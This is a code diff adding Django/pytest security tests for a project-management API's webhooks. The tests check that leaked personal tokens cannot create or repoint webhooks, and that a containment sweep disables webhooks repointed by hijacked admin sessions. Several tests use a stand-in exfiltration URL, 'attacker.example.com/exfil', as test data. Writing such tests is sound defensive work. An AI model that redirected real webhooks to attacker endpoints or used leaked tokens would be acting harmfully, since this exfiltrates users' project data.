@@ -6,6 +6,7 @@ import hashlib
 import hmac
 import urllib.error
 import urllib.request
+import uuid
 from datetime import date
 from unittest.mock import MagicMock, patch
 
@@ -14,7 +15,8 @@ from django.contrib.auth import get_user_model
 from rest_framework.test import APIClient
 
 from trueppm_api.apps.access.models import ProjectMembership, Role
-from trueppm_api.apps.projects.models import Calendar, Project
+from trueppm_api.apps.projects.authentication import TOKEN_PREFIX, sha256_hex
+from trueppm_api.apps.projects.models import SCOPE_LEGACY_FULL, ApiToken, Calendar, Project
 from trueppm_api.apps.webhooks.models import (
     DeliveryStatus,
     Webhook,
@@ -42,6 +44,25 @@ def calendar(db: object) -> Calendar:
 @pytest.fixture
 def project(calendar: Calendar) -> Project:
     return Project.objects.create(name="WHProject", start_date=date(2026, 3, 1), calendar=calendar)
+
+
+def _token_client(owner: object) -> APIClient:
+    """A session-less client bearing a live ``legacy:full`` personal token for
+    ``owner`` — the "leaked PAT belonging to a project Admin" shape #2939/#4461
+    close. Mirrors ``test_share_links.py``'s helper of the same name.
+    """
+    raw = f"{TOKEN_PREFIX}{uuid.uuid4().hex}{uuid.uuid4().hex}"
+    ApiToken.objects.create(
+        owner=owner,
+        name="leaked",
+        token_prefix=raw[len(TOKEN_PREFIX) : len(TOKEN_PREFIX) + 8],
+        token_hash=sha256_hex(raw),
+        created_by=owner,
+        scopes=[SCOPE_LEGACY_FULL],
+    )
+    c = APIClient()
+    c.credentials(HTTP_AUTHORIZATION=f"Bearer {raw}")
+    return c
 
 
 @pytest.fixture
@@ -156,6 +177,324 @@ def test_create_webhook_as_admin(admin_client: APIClient, project: Project) -> N
     assert resp.data["url"] == "https://example.com/hook"
     # Secret is echoed exactly once on create so the caller can record it (#893).
     assert resp.data["secret"] == "a" * 40
+
+
+@pytest.mark.django_db
+def test_create_webhook_refuses_a_token_caller_even_when_admin(
+    user: object, project: Project
+) -> None:
+    """A leaked PAT must not be able to mint this durable HMAC-signing credential
+    (#4461) — the same PAT-manages-PAT rule #2878 applied to ``/me/api-tokens/``
+    and #2939 applied to share links and git-automation secrets.
+    """
+    ProjectMembership.objects.update_or_create(
+        project=project, user=user, defaults={"role": Role.ADMIN}
+    )
+    resp = _token_client(user).post(
+        f"/api/v1/projects/{project.pk}/webhooks/",
+        {"url": "https://example.com/hook", "secret": "a" * 40, "events": ["task.created"]},
+        format="json",
+    )
+    assert resp.status_code == 403, resp.data
+    assert Webhook.objects.filter(project=project).count() == 0
+    # Listing is unaffected: GET never carries the secret, so it is not the
+    # reconnaissance step the create echo would be.
+    assert _token_client(user).get(f"/api/v1/projects/{project.pk}/webhooks/").status_code == 200
+
+
+@pytest.mark.django_db
+def test_update_webhook_refuses_a_token_caller_even_when_admin(
+    user: object, project: Project, webhook: Webhook
+) -> None:
+    """Same rule as create: a PATCH can repoint the delivery URL or rotate the
+    signing secret, either of which is a durable grant a leaked PAT should not be
+    able to extend itself with (#4461).
+    """
+    original_url = webhook.url
+    resp = _token_client(user).patch(
+        f"/api/v1/projects/{project.pk}/webhooks/{webhook.pk}/",
+        {"url": "https://attacker.example.com/exfil"},
+        format="json",
+    )
+    assert resp.status_code == 403, resp.data
+    webhook.refresh_from_db()
+    assert webhook.url == original_url
+
+
+@pytest.mark.django_db
+def test_update_records_an_editor_only_on_url_or_secret_change(
+    admin_client: APIClient, project: Project, webhook: Webhook, user: object
+) -> None:
+    """A write that touches neither `url`/`secret` nor re-enables a disabled
+    webhook must not record an editor row (#4461) — those are the only
+    durable-grant-shaped writes, and `revoke_personal_durable_grants` sweeps
+    on this set, so recording it on an unrelated write (relabeling `events`
+    on an already-active webhook) would widen who the sweep contains for no
+    reason. The re-enable case is covered separately in
+    ``test_reenabling_a_disabled_webhook_records_an_editor`` and
+    ``test_disabling_a_webhook_does_not_record_an_editor``.
+    """
+    resp = admin_client.patch(
+        f"/api/v1/projects/{project.pk}/webhooks/{webhook.pk}/",
+        {"events": ["task.created", "task.updated"]},
+        format="json",
+    )
+    assert resp.status_code == 200, resp.data
+    assert not webhook.editors.exists()
+
+    resp = admin_client.patch(
+        f"/api/v1/projects/{project.pk}/webhooks/{webhook.pk}/",
+        {"url": "https://example.com/repointed"},
+        format="json",
+    )
+    assert resp.status_code == 200, resp.data
+    assert set(webhook.editors.values_list("user_id", flat=True)) == {user.pk}
+
+
+@pytest.mark.django_db
+def test_reenabling_a_disabled_webhook_records_an_editor(project: Project, user: object) -> None:
+    """Round-3 GAP: re-enabling is durable-grant-shaped on its own, even with
+    `url`/`secret` untouched. A webhook disabled by the containment sweep (or
+    the auto-disable guard) still carries whatever `url`/`secret` it had; a
+    SECOND hijacked session that does nothing but flip `is_active` back on
+    restarts delivery to wherever it currently points. That re-enabler must
+    be recorded, or their own future containment would miss the row even
+    though they are the one who restarted the leak.
+    """
+    ProjectMembership.objects.update_or_create(
+        project=project, user=user, defaults={"role": Role.ADMIN}
+    )
+    coadmin = User.objects.create_user(username="wh_reenabler", password="pw")
+    ProjectMembership.objects.create(project=project, user=coadmin, role=Role.ADMIN)
+
+    wh = Webhook.objects.create(
+        project=project,
+        url="https://example.com/original",
+        secret="original-secret-1234567890123456",
+        events=["task.created"],
+        created_by=user,
+        is_active=False,
+    )
+    assert not wh.editors.exists()
+
+    coadmin_client = APIClient()
+    coadmin_client.force_authenticate(user=coadmin)
+    resp = coadmin_client.patch(
+        f"/api/v1/projects/{project.pk}/webhooks/{wh.pk}/",
+        {"is_active": True},
+        format="json",
+    )
+    assert resp.status_code == 200, resp.data
+    assert set(wh.editors.values_list("user_id", flat=True)) == {coadmin.pk}
+
+
+@pytest.mark.django_db
+def test_disabling_a_webhook_does_not_record_an_editor(
+    admin_client: APIClient, project: Project, webhook: Webhook
+) -> None:
+    """Disabling is the opposite shape — it only shrinks what is live — so it
+    must not record an editor (#4461), unlike re-enabling.
+    """
+    resp = admin_client.patch(
+        f"/api/v1/projects/{project.pk}/webhooks/{webhook.pk}/",
+        {"is_active": False},
+        format="json",
+    )
+    assert resp.status_code == 200, resp.data
+    assert not webhook.editors.exists()
+
+
+@pytest.mark.django_db
+def test_patch_is_active_true_on_an_already_active_webhook_does_not_record_an_editor(
+    admin_client: APIClient, project: Project, webhook: Webhook
+) -> None:
+    """Re-submitting `is_active: true` on an already-active webhook is a no-op,
+    not a re-enable — it must not record an editor either.
+    """
+    assert webhook.is_active is True
+    resp = admin_client.patch(
+        f"/api/v1/projects/{project.pk}/webhooks/{webhook.pk}/",
+        {"is_active": True},
+        format="json",
+    )
+    assert resp.status_code == 200, resp.data
+    assert not webhook.editors.exists()
+
+
+@pytest.mark.django_db
+def test_repoint_by_a_different_admin_is_caught_by_that_admins_own_sweep(
+    project: Project, user: object
+) -> None:
+    """#4461 BLOCKER: a project webhook's update has no registrant check — any
+    project Admin may repoint any other project webhook's URL or rotate its
+    secret (documented in webhooks.md's Containment section). Before this
+    fix, the registrant (`created_by`) is who gets contained, not whoever
+    actually holds the hijacked session that repointed the webhook — so a
+    DIFFERENT admin's own password reset/off-boarding left the row untouched,
+    and only an instance-wide `--all` sweep ever caught it. The repointing
+    admin's own containment must catch it instead, because the sweep also
+    matches ``webhook.editors``.
+
+    The registrant here (`user`) is never contained in this test — proving
+    the fix means the ADMIN WHO REPOINTED IT (not the creator) triggers
+    deactivation, which `created_by` alone could never do.
+    """
+    from trueppm_api.apps.access.services import revoke_personal_durable_grants
+
+    ProjectMembership.objects.update_or_create(
+        project=project, user=user, defaults={"role": Role.ADMIN}
+    )
+    coadmin = User.objects.create_user(username="wh_coadmin", password="pw")
+    ProjectMembership.objects.create(project=project, user=coadmin, role=Role.ADMIN)
+
+    wh = Webhook.objects.create(
+        project=project,
+        url="https://example.com/original",
+        secret="original-secret-1234567890123456",
+        events=["task.created"],
+        created_by=user,
+    )
+
+    coadmin_client = APIClient()
+    coadmin_client.force_authenticate(user=coadmin)
+    resp = coadmin_client.patch(
+        f"/api/v1/projects/{project.pk}/webhooks/{wh.pk}/",
+        {"url": "https://attacker.example.com/exfil"},
+        format="json",
+    )
+    assert resp.status_code == 200, resp.data
+
+    wh.refresh_from_db()
+    assert wh.created_by_id == user.pk
+    assert set(wh.editors.values_list("user_id", flat=True)) == {coadmin.pk}
+
+    # The repointing admin's own containment catches it — the fix. `user`
+    # (the registrant) is never touched by this call, so a pre-fix sweep
+    # that matched only `created_by` would have left `wh` active here.
+    revoke_personal_durable_grants(coadmin)
+    wh.refresh_from_db()
+    assert wh.is_active is False
+    assert wh.disabled_at is not None
+
+
+@pytest.mark.django_db
+def test_sequence_a_later_secret_rotation_by_the_registrant_does_not_erase_attribution(
+    project: Project, user: object
+) -> None:
+    """Round-2 BLOCKER, sequence (a): a mutable "last modified by" field broke on
+    exactly this sequence — Admin B's hijacked session repoints `url`, then
+    Admin A (the registrant) later does a routine, unrelated secret rotation.
+    A single-field stamp would be overwritten to A, and B's own password
+    reset/off-boarding would no longer match. The additive editors set must
+    not have that failure: B's row stays, regardless of what A does afterward.
+    """
+    from trueppm_api.apps.access.services import revoke_personal_durable_grants
+
+    ProjectMembership.objects.update_or_create(
+        project=project, user=user, defaults={"role": Role.ADMIN}
+    )
+    coadmin_b = User.objects.create_user(username="wh_seq_a_b", password="pw")
+    ProjectMembership.objects.create(project=project, user=coadmin_b, role=Role.ADMIN)
+
+    wh = Webhook.objects.create(
+        project=project,
+        url="https://example.com/original",
+        secret="original-secret-1234567890123456",
+        events=["task.created"],
+        created_by=user,
+    )
+
+    # B's hijacked session repoints the URL.
+    b_client = APIClient()
+    b_client.force_authenticate(user=coadmin_b)
+    resp = b_client.patch(
+        f"/api/v1/projects/{project.pk}/webhooks/{wh.pk}/",
+        {"url": "https://attacker.example.com/exfil"},
+        format="json",
+    )
+    assert resp.status_code == 200, resp.data
+
+    # A — the registrant, acting legitimately and much later — rotates the
+    # secret. This must NOT remove B from the editors set.
+    a_client = APIClient()
+    a_client.force_authenticate(user=user)
+    resp = a_client.patch(
+        f"/api/v1/projects/{project.pk}/webhooks/{wh.pk}/",
+        {"secret": "b" * 40},
+        format="json",
+    )
+    assert resp.status_code == 200, resp.data
+
+    wh.refresh_from_db()
+    assert set(wh.editors.values_list("user_id", flat=True)) == {coadmin_b.pk, user.pk}
+
+    # B's own containment still catches the row.
+    revoke_personal_durable_grants(coadmin_b)
+    wh.refresh_from_db()
+    assert wh.is_active is False
+
+
+@pytest.mark.django_db
+def test_sequence_b_a_later_events_only_put_does_not_erase_attribution(
+    project: Project, user: object
+) -> None:
+    """Round-2 BLOCKER, sequence (b): same repoint by B, but A's later write is a
+    PUT that only means to change `events` — PUT requires `url` in the request
+    body, so the unchanged, still-evil URL is present in `validated_data` too.
+    A single-field stamp flipped to A on this write even though A touched
+    neither field in substance; the additive editors set does not, because B's
+    row is never removed, and A also lands in the set (A did re-submit `url`,
+    so by WebhookViewSet.perform_update's "url or secret present" rule A is
+    recorded too — harmless, since A's own containment already covers A).
+    """
+    from trueppm_api.apps.access.services import revoke_personal_durable_grants
+
+    ProjectMembership.objects.update_or_create(
+        project=project, user=user, defaults={"role": Role.ADMIN}
+    )
+    coadmin_b = User.objects.create_user(username="wh_seq_b_b", password="pw")
+    ProjectMembership.objects.create(project=project, user=coadmin_b, role=Role.ADMIN)
+
+    wh = Webhook.objects.create(
+        project=project,
+        url="https://example.com/original",
+        secret="original-secret-1234567890123456",
+        events=["task.created"],
+        created_by=user,
+    )
+
+    b_client = APIClient()
+    b_client.force_authenticate(user=coadmin_b)
+    resp = b_client.patch(
+        f"/api/v1/projects/{project.pk}/webhooks/{wh.pk}/",
+        {"url": "https://attacker.example.com/exfil"},
+        format="json",
+    )
+    assert resp.status_code == 200, resp.data
+    evil_url = wh.url  # unchanged by A's PUT below
+
+    # A sends a full PUT meaning only to add an event, but PUT requires `url`
+    # in the body — the still-evil URL rides along, unchanged.
+    a_client = APIClient()
+    a_client.force_authenticate(user=user)
+    resp = a_client.put(
+        f"/api/v1/projects/{project.pk}/webhooks/{wh.pk}/",
+        {
+            "url": evil_url,
+            "events": ["task.created", "task.updated"],
+        },
+        format="json",
+    )
+    assert resp.status_code == 200, resp.data
+
+    wh.refresh_from_db()
+    assert wh.url == evil_url  # still pointed at the attacker
+    assert coadmin_b.pk in set(wh.editors.values_list("user_id", flat=True))
+
+    # B's own containment still catches the row.
+    revoke_personal_durable_grants(coadmin_b)
+    wh.refresh_from_db()
+    assert wh.is_active is False
 
 
 @pytest.mark.django_db
@@ -405,6 +744,36 @@ def test_dispatch_skips_inactive_webhook(project: Project, webhook: Webhook) -> 
     webhook.is_active = False
     webhook.save()
     from trueppm_api.apps.webhooks import tasks as wh_tasks
+
+    with patch.object(wh_tasks, "deliver_webhook") as mock_task:
+        mock_task.delay = MagicMock()
+        from trueppm_api.apps.webhooks.dispatch import dispatch_webhooks
+
+        dispatch_webhooks(str(project.pk), "task.created", {"id": "t1"})
+
+        assert WebhookDelivery.objects.count() == 0
+        mock_task.delay.assert_not_called()
+
+
+@pytest.mark.django_db
+def test_dispatch_skips_a_webhook_deactivated_by_the_durable_grants_sweep(
+    project: Project, webhook: Webhook
+) -> None:
+    """#4461 end-to-end: the containment sweep's effect on ``is_active`` is what
+    actually stops dispatch, not just a documented claim. Exercises
+    ``revoke_personal_durable_grants`` directly (the function every one of the
+    three compromise-response levers — password reset, off-boarding,
+    ``revoke_api_tokens --all`` — calls) rather than re-asserting the generic
+    ``is_active=False`` behavior ``test_dispatch_skips_inactive_webhook`` already
+    covers.
+    """
+    from trueppm_api.apps.access.services import revoke_personal_durable_grants
+    from trueppm_api.apps.webhooks import tasks as wh_tasks
+
+    revoked = revoke_personal_durable_grants(webhook.created_by)
+    assert revoked == (0, 0, 1)
+    webhook.refresh_from_db()
+    assert webhook.is_active is False
 
     with patch.object(wh_tasks, "deliver_webhook") as mock_task:
         mock_task.delay = MagicMock()
